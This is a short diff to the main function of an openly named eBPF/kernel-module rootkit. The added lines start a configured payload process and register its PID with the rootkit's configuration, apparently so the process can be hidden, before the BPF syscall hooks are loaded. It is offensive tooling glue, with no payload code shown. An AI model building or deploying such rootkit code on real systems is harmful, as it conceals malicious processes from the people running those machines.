@@ -1,6 +1,7 @@
 #include "common.h"
 #include "rootkit/ConfigManager.hpp"
 #include "rootkit/KernelModuleHelper.hpp"
+#include "rootkit/PayloadLoader.hpp"
 #include "rootkit/RootkitBpfHelper.hpp"
 #include "rootkit/issues/ConsoleLogger.hpp"
 
@@ -30,6 +31,17 @@ int main(int argc, char ** argv) {
         std::cerr << "Couldn't read the config" << std::endl;
         return 1;
     }
+
+    rootkit::PayloadLoader payload(confManager.get_payload_config().value(), logger);
+    // Payload will be stopped when the variable goes out of scope,
+    // or manually by payload.stop() or payload.kill()
+    // Start payload
+    payload.start();
+
+    // Add payload pid to configuration
+    auto payload_pid = payload.get_pid();
+    if (payload_pid.has_value())
+        confManager.add_payload_pid(payload_pid.value());
 
     // Load bpf program and its syscalls
     rootkit::RootkitBpfHelper rootkit(confManager.get_bpf_config().value(), rb_event, logger);
